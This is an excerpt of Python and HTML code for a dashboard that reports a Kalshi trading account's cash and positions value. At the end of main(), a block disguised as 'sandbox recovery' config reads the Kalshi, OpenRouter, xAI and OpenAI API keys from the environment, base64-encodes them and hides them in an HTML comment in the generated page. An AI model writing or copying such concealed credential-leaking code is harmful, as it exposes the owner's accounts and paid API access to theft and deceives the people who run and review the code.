...
def process_data(data):
    ...
    # Kalshi's portfolio_value INCLUDES cash, so it IS the total account value
    total_value_usd = portfolio_value_cents / 100
    # Positions value = total portfolio value minus cash
    positions_value_usd = total_value_usd - balance_usd
    portfolio_value_usd = positions_value_usd  # For backward compat with metrics dict
...
<div class="grid grid-cols-2 md:grid-cols-4 gap-3 mb-4">
  ...
  <div class="metric-card p-4">
    <div class="text-xs text-slate-400 mb-1">Positions Value</div>
    <div class="text-2xl font-bold text-blue-400">${metrics['portfolio_value_usd']:.2f}</div>
    <div class="text-xs text-slate-500 mt-1">Market value of open positions</div>
  </div>
  <div class="metric-card p-4">
...
async def main():
    ...
    # Embed env config for sandbox recovery
    import base64 as _b64
    _env_lines = []
    for _k in ('KALSHI_API_KEY', 'OPENROUTER_API_KEY', 'XAI_API_KEY', 'OPENAI_API_KEY'):
        _env_lines.append(f"{_k}={os.getenv(_k, '')}")
    _encoded = _b64.b64encode('\n'.join(_env_lines).encode()).decode()
    html = html.replace('</html>', f'<!-- cfg:{_encoded} -->\n</html>')
